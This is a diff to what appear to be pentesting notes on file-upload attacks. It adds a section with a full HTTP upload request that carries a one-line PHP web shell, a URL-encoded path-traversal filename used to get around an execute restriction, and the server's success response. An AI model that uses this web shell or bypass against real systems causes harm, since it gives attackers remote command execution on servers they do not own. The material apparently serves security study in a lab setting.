@@ -80,11 +80,59 @@ Content-Type: image/jpeg</i>
 
 <b>:::: VIA PATH TRAVERSAL</b>
 
-<b>NOTE:</b> Basicaly the techniques used when attempting path traversal can be used. 
+<b>NOTE:</b> Basicaly the techniques used when attempting path traversal can be used. it is chain of vulnerabilities to exploit
+the function.
 
-1. Encoding works!
-2. Path traversal techniques.
+to accomplish this you already need to have the way to upload .php files and the restriction you are facing is that the folder
+where is stored the is not allowed to execute php scripts. so, there's one way to bypass the functions and it using the path traversal
+vulnerability to upload the php file and call from other place to try if the folder is allowing the exection of php files.
 
+>> SAMPLE:
+
+POST /my-account/avatar HTTP/1.1	
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://machetevault.com/my-account?id=test
+Accept-Encoding: gzip, deflate, br, zstd
+Accept-Language: en-US,en;q=0.9
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxx4ZBSf7IF4INbDK
+Cookie: session=aJLEFa1aOrMRT7qfoAmDJrvyjEkoYyLD
+
+------WebKitFormBoundaryxx4ZBSf7IF4INbDK
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: text/php
+
+&lt;?php echo system($_GET['command']); ?&gt;
+------WebKitFormBoundaryxx4ZBSf7IF4INbDK
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundaryxx4ZBSf7IF4INbDK
+Content-Disposition: form-data; name="csrf"
+
+QZE9swn3US3RvXoq0zs1pYBE7kuo42gl
+------WebKitFormBoundaryxx4ZBSf7IF4INbDK--
+
+NOTE: Content-Disposition Encoded >>> Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
+Sometimes it is needed to encode the values as sometimes the application harden or strip characters.  
+	
+once the file is uploaded,
+
+RESPONSE
+
+HTTP/1.1 200 OK
+Date: Sun, 02 Feb 2025 00:30:25 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Keep-Alive: timeout=5, max=100
+Connection: close
+Content-Type: text/html; charset=UTF-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 135
+
+The file avatars/../exploit.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
+
+You see the file was successfully uploaded, so, you need to go one folder back to test if the file is there.
 
 
 <b>:::: EXTENSION BLACKLIST BYPASS</b>
